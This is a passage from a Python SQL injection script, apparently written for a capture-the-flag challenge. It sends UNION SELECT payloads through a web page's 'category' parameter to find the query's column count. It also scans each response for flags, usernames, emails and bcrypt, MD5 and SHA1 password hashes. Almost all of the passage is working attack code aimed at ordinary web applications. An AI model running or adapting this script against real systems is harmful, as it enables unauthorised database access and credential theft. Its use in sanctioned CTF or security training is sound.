    url = f"{target}?category={url_encoded}"
    
    try:
        start_time = time.time()
        response = requests.get(url, headers=headers, timeout=15)
        elapsed = time.time() - start_time
        
        print(f"Status: {response.status_code} | Time: {elapsed:.2f}s | Size: {len(response.text)} bytes")
        
        # Look for data in response
        patterns_to_find = [
            r'FLAG\{[^}]+\}',  # Flag pattern
            r'\b(admin|user|password|email|flag)\b',  # Interesting keywords
            r'\b(\w+)\.(\w+)\b',  # Table.column references
            r'\b\w+@\w+\.\w+\b',  # Email addresses
            r'\$\$[a-f0-9]+\$\$',  # Hashed passwords (bcrypt)
            r'[a-f0-9]{32}',  # MD5 hashes
            r'[a-f0-9]{40}',  # SHA1 hashes
        ]
        
        found_items = []
        for pattern in patterns_to_find:
            matches = re.findall(pattern, response.text, re.I)
            if matches:
                if pattern == r'FLAG\{[^}]+\}':
                    print(f"[!!!] FLAG FOUND: {matches[0]}")
                    return {'flag': matches[0], 'text': response.text}
                
                # Filter out false positives for table.column
                if pattern == r'\b(\w+)\.(\w+)\b':
                    # Skip common HTML/CSS references
                    filtered = [m for m in matches if m[0].lower() not in ['styles', 'css', 'index', 'php', 'this', 'form', 'option', 'value', 'href']]
                    if filtered:
                        found_items.extend(filtered)
                else:
                    found_items.extend(matches)
        
        if found_items:
            # Remove duplicates
            unique_items = list(set(found_items))
            print(f"[!] Interesting data found: {unique_items}")
            return {'data': unique_items, 'text': response.text}
        
        return {'text': response.text, 'size': len(response.text)}
        
    except Exception as e:
        print(f"[!] Error: {e}")
        return {'error': str(e)}

# Step 1: Determine correct column count for UNION
print("\n" + "=" * 80)
print("STEP 1: Finding correct column count")
print("=" * 80)

# Try different column counts with NULL to avoid type mismatches
column_count = None
for cols in range(1, 11):
    nulls = ','.join(['NULL'] * cols)
    payload = f"' UNION SELECT {nulls}-- "
    
    result = send_payload(payload, f"Testing {cols} columns with NULL")
    
    # If we get different size from baseline error (around 1398-1539), we found the right count
    # Also check if no SQL error indicators in response
    if result.get('size', 0) < 1390 or 'query' not in result.get('text', ''):
        column_count = cols
        print(f"[!] Potential column count found: {cols}")
        break

if not column_count:
    print("[!] Could not determine column count from NULL tests")
    column_count = 3  # Default guess

print(f"[+] Using column count: {column_count}")

